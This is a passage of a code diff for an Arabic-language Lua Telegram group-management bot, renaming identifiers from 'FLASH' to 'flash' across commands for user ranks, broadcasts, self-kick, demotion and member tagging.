-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا بك 👋 ، { '..result.first_name_..' }\n\n❅∫ معرفك ، { '..username..' }\n❅∫ ايديك ، { '..result.id_..' }\n❅∫ نقاطك ، { '..user_nkt..' }\n\n❅∫ { احصائيات الرسائل } ⬇️،\n❅∫ الرسائل ، { '..(user_msgs + FLASHy)..' / '..(FLASH)..'} \n❅∫  الملصقات ، { '..sticker..' }\n❅∫ الصور ، { '..Photo..' }\n❅∫ الصوت ، { '..Voice..' }\n❅∫ المتحركه ، { '..Gif..' }\n❅∫  الفيديو ، { '..Video..' }\n❅∫ الجهات ، { '..cont..' }\n❅∫ التفاعل ، { '..formsgg(msguser)..' } \n\n❅∫ موقعك ، '..FLASH_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا بك 👋 ، { '..result.first_name_..' }\n\n❅∫ معرفك ، { '..username..' }\n❅∫ ايديك ، { '..result.id_..' }\n❅∫ نقاطك ، { '..user_nkt..' }\n\n❅∫ { احصائيات الرسائل } ⬇️،\n❅∫ الرسائل ، { '..(user_msgs + flashy)..' / '..(flash)..'} \n❅∫  الملصقات ، { '..sticker..' }\n❅∫ الصور ، { '..Photo..' }\n❅∫ الصوت ، { '..Voice..' }\n❅∫ المتحركه ، { '..Gif..' }\n❅∫  الفيديو ، { '..Video..' }\n❅∫ الجهات ، { '..cont..' }\n❅∫ التفاعل ، { '..formsgg(msguser)..' } \n\n❅∫ موقعك ، '..flash_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
 end
 getUser(msg.sender_user_id_,get_me)
 end
---     By Developer FLASH     -- 
-if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and flash11(msg) then
 function rt_by_reply(extra, result, success) 
-local user_info_ = FLASHdx1:get(FLASH..'user:Name' .. result.sender_user_id_)
-local FLASH_res = user_info_
+local user_info_ = flashdx1:get(flash..'user:Name' .. result.sender_user_id_)
+local flash_res = user_info_
 if user_info_ then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
 if da.status_.ID == "ChatMemberStatusCreator" then
@@ -4427,166 +4427,166 @@ renk_gps = 'عضو'
 end
 if result.id_ then 
 if tonumber(result.sender_user_id_) == tonumber(1488653639) then
-FLASH1 = 'مبرمج السورس  '
+flash1 = 'مبرمج السورس  '
 elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
-FLASH1 = "مطور اساسي "
+flash1 = "مطور اساسي "
 elseif is_sudoid(result.sender_user_id_) then
-FLASH1 = "مطور ثانوي"
+flash1 = "مطور ثانوي"
 elseif is_admin(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "مطور رتبه ثالثه "
+flash1 = "مطور رتبه ثالثه "
 elseif is_onall(result.sender_user_id_) then
-FLASH1 = "مدير عام "
+flash1 = "مدير عام "
 elseif is_moall(result.sender_user_id_) then
-FLASH1 = "ادمن عام "
+flash1 = "ادمن عام "
 elseif is_vpall(result.sender_user_id_) then
-FLASH1 = "مميز عام "
+flash1 = "مميز عام "
 elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "منشئ اساسي "
+flash1 = "منشئ اساسي "
 elseif is_monsh2(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "منشئ "
+flash1 = "منشئ "
 elseif is_owner(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "مدير "
+flash1 = "مدير "
 elseif is_momod(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "ادمن "
+flash1 = "ادمن "
 elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "عضو مميز "
+flash1 = "عضو مميز "
 elseif is_donky(result.sender_user_id_, msg.chat_id_) then
-FLASH1 = "مطي مرتب 😹💔"
+flash1 = "مطي مرتب 😹💔"
 else
-FLASH1 = "عضو فقط "
+flash1 = "عضو فقط "
 end end
-local FLASH = '*❅∫ اهلا بك عزيزي ، { '..renk_FLASH(msg)..' }*\n*❅∫ رتبه المستخدم ،* { '..FLASH_res..' }\n*❅∫ في البوت ، { '..FLASH_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*❅∫ في الجروب ، { '..renk_gps..' }*\n'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
+local flash = '*❅∫ اهلا بك عزيزي ، { '..renk_flash(msg)..' }*\n*❅∫ رتبه المستخدم ،* { '..flash_res..' }\n*❅∫ في البوت ، { '..flash_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*❅∫ في الجروب ، { '..renk_gps..' }*\n'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
 end,nil) end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if is_sudo(msg) then
 if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
-function FLASH(extra,result,success)
-local listgp = FLASHdx1:smembers(FLASH.."bot:groups")
+function flash(extra,result,success)
+local listgp = flashdx1:smembers(flash.."bot:groups")
 for k,v in pairs(listgp) do
 forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
 end
-local listpv = FLASHdx1:smembers(FLASH.."bot:userss")
+local listpv = flashdx1:smembers(flash.."bot:userss")
 for k,v in pairs(listpv) do
 forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
 end end
-local gps = FLASHdx1:scard(FLASH..'bot:groups') or 0
-local pvs = FLASHdx1:scard(FLASH..'bot:userss') or 0
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم اذاعة رسالتك بالتوجيه ، \n❅∫ في ، ❨ '..gps..' ❩ مجموعه \n❅∫ والى ، ❨ '..pvs..' ❩ مشترك ', 1, 'md')
-getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),FLASH)
+local gps = flashdx1:scard(flash..'bot:groups') or 0
+local pvs = flashdx1:scard(flash..'bot:userss') or 0
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم اذاعة رسالتك بالتوجيه ، \n❅∫ في ، ❨ '..gps..' ❩ مجموعه \n❅∫ والى ، ❨ '..pvs..' ❩ مشترك ', 1, 'md')
+getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),flash)
 end end
---     By Developer FLASH     -- 
-if text:match("^(time)$") or text:match("^(الوقت)$")  and FLASH11(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ الساعه ، '..os.date("%I:%M%p")..' \n❅∫ التاريخ ، '..os.date("%Y/%m/%d")..' \n', 1, 'md')
+--     By Developer flash     -- 
+if text:match("^(time)$") or text:match("^(الوقت)$")  and flash11(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ الساعه ، '..os.date("%I:%M%p")..' \n❅∫ التاريخ ، '..os.date("%Y/%m/%d")..' \n', 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^مشاهده المنشور$") and FLASH11(msg) then
-FLASHdx1:set(FLASH..'bot:viewget'..msg.sender_user_id_,true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي المنشور الان ، ', 1, 'md')
+--     By Developer flash     -- 
+if text:match("^مشاهده المنشور$") and flash11(msg) then
+flashdx1:set(flash..'bot:viewget'..msg.sender_user_id_,true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ ارسل لي المنشور الان ، ', 1, 'md')
 end
---     By Developer FLASH     -- 
-if text:match("^اطردني$") and FLASH11(msg) then
-if not FLASHdx1:get(FLASH.."lock_kickme"..msg.chat_id_) then
-FLASHdx1:set(FLASH..'yes'..msg.sender_user_id_..'', 'kickyes')
-FLASHdx1:set(FLASH..'no'..msg.sender_user_id_..'', 'kickno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل *{ نعم }* ليتم طردك ،\n❅∫ ارسل *{ لا } *ليتم الغاء طردك ، ", 1, "md")
+--     By Developer flash     -- 
+if text:match("^اطردني$") and flash11(msg) then
+if not flashdx1:get(flash.."lock_kickme"..msg.chat_id_) then
+flashdx1:set(flash..'yes'..msg.sender_user_id_..'', 'kickyes')
+flashdx1:set(flash..'no'..msg.sender_user_id_..'', 'kickno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ارسل *{ نعم }* ليتم طردك ،\n❅∫ ارسل *{ لا } *ليتم الغاء طردك ، ", 1, "md")
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه معطله . ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه الخاصيه معطله . ', 1, 'md')
 end end
-local kickme = FLASHdx1:get(FLASH..'yes'..msg.sender_user_id_..'')
+local kickme = flashdx1:get(flash..'yes'..msg.sender_user_id_..'')
 if kickme == 'kickyes' then
 if text:match("^نعم$") then
 if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا استطيع طرد المشرفين ، ", 1, "md")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا استطيع طرد المشرفين ، ", 1, "md")
 else
-local kickme = FLASHdx1:get(FLASH..'yes'..msg.sender_user_id_..'')
+local kickme = flashdx1:get(flash..'yes'..msg.sender_user_id_..'')
 if kickme == 'kickyes' then
 chat_kick(msg.chat_id_, msg.sender_user_id_)
-FLASHdx1:del(FLASH..'yes'..msg.sender_user_id_..'', 'kickyes')
-FLASHdx1:del(FLASH..'no'..msg.sender_user_id_..'', 'kickno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم طردك عزيزي ،", 1, "md")
+flashdx1:del(flash..'yes'..msg.sender_user_id_..'', 'kickyes')
+flashdx1:del(flash..'no'..msg.sender_user_id_..'', 'kickno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم طردك عزيزي ،", 1, "md")
 end end end
 if text:match("^لا$") then
-local notkickme = FLASHdx1:get(FLASH..'no'..msg.sender_user_id_..'')
+local notkickme = flashdx1:get(flash..'no'..msg.sender_user_id_..'')
 if notkickme == 'kickno' then
-FLASHdx1:del(FLASH..'yes'..msg.sender_user_id_..'', 'kickyes')
-FLASHdx1:del(FLASH..'no'..msg.sender_user_id_..'', 'kickno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء طردك ،", 1, "md")
+flashdx1:del(flash..'yes'..msg.sender_user_id_..'', 'kickyes')
+flashdx1:del(flash..'no'..msg.sender_user_id_..'', 'kickno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء طردك ،", 1, "md")
 end end end
---     By Developer FLASH     -- 
-if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH.."lock_kickme"..msg.chat_id_) then
-FLASHdx1:set(FLASH.."lock_kickme"..msg.chat_id_, true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل امر اطردني ، ', 1, 'md')
+--     By Developer flash     -- 
+if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash.."lock_kickme"..msg.chat_id_) then
+flashdx1:set(flash.."lock_kickme"..msg.chat_id_, true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل امر اطردني ، ', 1, 'md')
 end end
-if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH.."lock_kickme"..msg.chat_id_) then
-FLASHdx1:del(FLASH.."lock_kickme"..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل امر اطردني ، ', 1, 'md')
+if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash.."lock_kickme"..msg.chat_id_) then
+flashdx1:del(flash.."lock_kickme"..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل امر اطردني ، ', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text:match("^نزلني$") and FLASH11(msg) then
-if not FLASHdx1:get(FLASH.."lock_delme"..msg.chat_id_) then
-FLASHdx1:set(FLASH..'yesdel'..msg.sender_user_id_..'', 'delyes')
-FLASHdx1:set(FLASH..'nodel'..msg.sender_user_id_..'', 'delno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ هل انت متأكد من تنزيلك ،\n❅∫ ارسل *{ نعم }* ليتم الامر \n❅∫ ارسل *{ لا }* لالغاء الامر ", 1, "md")
+--     By Developer flash     -- 
+if text:match("^نزلني$") and flash11(msg) then
+if not flashdx1:get(flash.."lock_delme"..msg.chat_id_) then
+flashdx1:set(flash..'yesdel'..msg.sender_user_id_..'', 'delyes')
+flashdx1:set(flash..'nodel'..msg.sender_user_id_..'', 'delno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ هل انت متأكد من تنزيلك ،\n❅∫ ارسل *{ نعم }* ليتم الامر \n❅∫ ارسل *{ لا }* لالغاء الامر ", 1, "md")
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه هذه الخاصيه معطله ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذه هذه الخاصيه معطله ،', 1, 'md')
 end end
-local delme = FLASHdx1:get(FLASH..'yesdel'..msg.sender_user_id_..'')
+local delme = flashdx1:get(flash..'yesdel'..msg.sender_user_id_..'')
 if delme == 'delyes' then
 if text:match("^نعم$") then
-local delme = FLASHdx1:get(FLASH..'yesdel'..msg.sender_user_id_..'')
+local delme = flashdx1:get(flash..'yesdel'..msg.sender_user_id_..'')
 if delme == 'delyes' then
-if FLASHdx1:sismember(FLASH..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) then
 monsh = 'المنشئين الاساسيين ، ' else monsh = '' end 
-if FLASHdx1:sismember(FLASH..'bot:monsh2:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:monsh2:'..msg.chat_id_, msg.sender_user_id_) then
 monsh2 = 'المنشئين ، ' else monsh2 = '' end 
-if FLASHdx1:sismember(FLASH..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) then
 owner = 'المدراء ، ' else owner = '' end
-if FLASHdx1:sismember(FLASH..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) then
 momod = 'الادمنيه ، ' else momod = '' end
-if FLASHdx1:sismember(FLASH..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) then
 vipmem = 'المميزين ، ' else vipmem = '' end
-if FLASHdx1:sismember(FLASH..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
 donky = 'المطايه ، ' else donky = '' end 
-if FLASHdx1:sismember(FLASH..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) or FLASHdx1:sismember(FLASH..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) or FLASHdx1:sismember(FLASH..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) or FLASHdx1:sismember(FLASH..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) or FLASHdx1:sismember(FLASH..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
-FLASHdx1:srem(FLASH..'bot:monsh:'..msg.chat_id_,msg.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:monsh2:'..msg.chat_id_,msg.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:owners:'..msg.chat_id_,msg.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:momod:'..msg.chat_id_,msg.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:vipmem:'..msg.chat_id_,msg.sender_user_id_)
-FLASHdx1:srem(FLASH..'bot:donky:'..msg.chat_id_,msg.sender_user_id_) 
-FLASHdx1:del(FLASH..'yesdel'..msg.sender_user_id_..'', 'delyes') 
-FLASHdx1:del(FLASH..'nodel'..msg.sender_user_id_..'', 'delno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيلك من ، \n ( "..monsh..''..monsh2..''..owner..''..momod..''..vipmem..''..donky.." )  \n", 1, "md")
+if flashdx1:sismember(flash..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) or flashdx1:sismember(flash..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) or flashdx1:sismember(flash..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) or flashdx1:sismember(flash..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) or flashdx1:sismember(flash..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
+flashdx1:srem(flash..'bot:monsh:'..msg.chat_id_,msg.sender_user_id_)
+flashdx1:srem(flash..'bot:monsh2:'..msg.chat_id_,msg.sender_user_id_)
+flashdx1:srem(flash..'bot:owners:'..msg.chat_id_,msg.sender_user_id_)
+flashdx1:srem(flash..'bot:momod:'..msg.chat_id_,msg.sender_user_id_)
+flashdx1:srem(flash..'bot:vipmem:'..msg.chat_id_,msg.sender_user_id_)
+flashdx1:srem(flash..'bot:donky:'..msg.chat_id_,msg.sender_user_id_) 
+flashdx1:del(flash..'yesdel'..msg.sender_user_id_..'', 'delyes') 
+flashdx1:del(flash..'nodel'..msg.sender_user_id_..'', 'delno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم تنزيلك من ، \n ( "..monsh..''..monsh2..''..owner..''..momod..''..vipmem..''..donky.." )  \n", 1, "md")
 else 
-FLASHdx1:del(FLASH..'yesdel'..msg.sender_user_id_..'', 'delyes') 
-FLASHdx1:del(FLASH..'nodel'..msg.sender_user_id_..'', 'delno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ ليس لديك اي رتبه هنا ،", 1, "md")
+flashdx1:del(flash..'yesdel'..msg.sender_user_id_..'', 'delyes') 
+flashdx1:del(flash..'nodel'..msg.sender_user_id_..'', 'delno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ ليس لديك اي رتبه هنا ،", 1, "md")
 end end end
 if text:match("^لا$") then
-local notdelme = FLASHdx1:get(FLASH..'nodel'..msg.sender_user_id_..'')
+local notdelme = flashdx1:get(flash..'nodel'..msg.sender_user_id_..'')
 if notdelme == 'delno' then
-FLASHdx1:del(FLASH..'yesdel'..msg.sender_user_id_..'', 'delyes')
-FLASHdx1:del(FLASH..'nodel'..msg.sender_user_id_..'', 'delno')
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء تنزيلك ،", 1, "md")
+flashdx1:del(flash..'yesdel'..msg.sender_user_id_..'', 'delyes')
+flashdx1:del(flash..'nodel'..msg.sender_user_id_..'', 'delno')
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء تنزيلك ،", 1, "md")
 end end end   
---     By Developer FLASH     -- 
-if text == 'تعطيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if not FLASHdx1:get(FLASH.."lock_delme"..msg.chat_id_) then
-FLASHdx1:set(FLASH.."lock_delme"..msg.chat_id_, true)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تعطيل امر نزلني ،', 1, 'md')
+--     By Developer flash     -- 
+if text == 'تعطيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if not flashdx1:get(flash.."lock_delme"..msg.chat_id_) then
+flashdx1:set(flash.."lock_delme"..msg.chat_id_, true)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تعطيل امر نزلني ،', 1, 'md')
 end end
-if text == 'تفعيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
-if FLASHdx1:get(FLASH.."lock_delme"..msg.chat_id_) then
-FLASHdx1:del(FLASH.."lock_delme"..msg.chat_id_)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تفعيل امر نزلني ،', 1, 'md')
+if text == 'تفعيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
+if flashdx1:get(flash.."lock_delme"..msg.chat_id_) then
+flashdx1:del(flash.."lock_delme"..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تفعيل امر نزلني ،', 1, 'md')
 end end
---     By Developer FLASH     -- 
-if text:match("^كلهم (.*)$")  and FLASH11(msg) then
+--     By Developer flash     -- 
+if text:match("^كلهم (.*)$")  and flash11(msg) then
 local txt = {string.match(text, "^(كلهم) (.*)$")}
 function tall(f1, f2)
 local text = "❅∫  "..txt[2].." \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
@@ -4596,98 +4596,98 @@ local chat = msg.chat_id_
 i = 0
 for k, v in pairs(f2.members_) do
 i = i + 1
-if FLASHdx1:get(bot_id..'FLASH:UserName'..v.user_id_) then
-text = text..""..i.." - : [@"..FLASHdx1:get(bot_id..'FLASH:UserName'..v.user_id_).."]\n"
+if flashdx1:get(bot_id..'flash:UserName'..v.user_id_) then
+text = text..""..i.." - : [@"..flashdx1:get(bot_id..'flash:UserName'..v.user_id_).."]\n"
 else
 text = text..""..i.." - : "..v.user_id_.."\n"
 end
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end
 tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
 end
---     By Developer FLASH     -- 
-if text == "all" or text == "@all" or text == "تاك للكل" or text == "تاك الكل" and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then if FLASHdx1:get(FLASH..'bot:lock_tag'..msg.chat_id_) then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') else if FLASHdx1:get(FLASH.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end FLASHdx1:setex(bot_id..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,FLASH)  tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = FLASH.member_count_},function(dxx,FLASHr) x = 0 tags = 0 local list = FLASHr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
---     By Developer FLASH     -- 
-if text:match("^all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then local txt = {string.match(text, "^(all) (.*)$")} if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') end if FLASHdx1:get(FLASH.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end FLASHdx1:setex(FLASH..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,FLASH) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = FLASH.member_count_},function(dxx,FLASHr) x = 0 tags = 0 local list = FLASHr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
---     By Developer FLASH     -- 
-if text:match("^@all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then local txt = {string.match(text, "^(@all) (.*)$")} if FLASHdx1:get(FLASH..'bot:lock_geam'..msg.chat_id_) then FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') else if FLASHdx1:get(FLASH.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end FLASHdx1:setex(FLASH..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,FLASH) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = FLASH.member_count_},function(dxx,FLASHr) x = 0 tags = 0 local list = FLASHr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
---     By Developer FLASH     --
-if text == 'الجروبات' and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then 
-local FLASH = FLASHdx1:scard(FLASH.."bot:groups")
-local dx = FLASHdx1:scard("FLASH:addg"..bot_id) or 0 
-local users = FLASHdx1:scard(FLASH.."bot:userss")
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ *اعضاء الخاص ، { '..users..' }\n❅∫ عدد جروبات ، { '..FLASH..' }\n❅∫ الجروبات المفعله ، { '..dx..' }\n❅∫ الغير مفعله ، {'..(FLASH - dx)..'} *', 1, 'md')
+--     By Developer flash     -- 
+if text == "all" or text == "@all" or text == "تاك للكل" or text == "تاك الكل" and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then if flashdx1:get(flash..'bot:lock_tag'..msg.chat_id_) then flashdx(msg.chat_id_, msg.id_, 1, '❅∫ هذا الامر معطل ', 1, 'md') else if flashdx1:get(flash.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end flashdx1:setex(bot_id..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,flash)  tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = flash.member_count_},function(dxx,flashr) x = 0 tags = 0 local list = flashr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
+--     By Developer flash     -- 
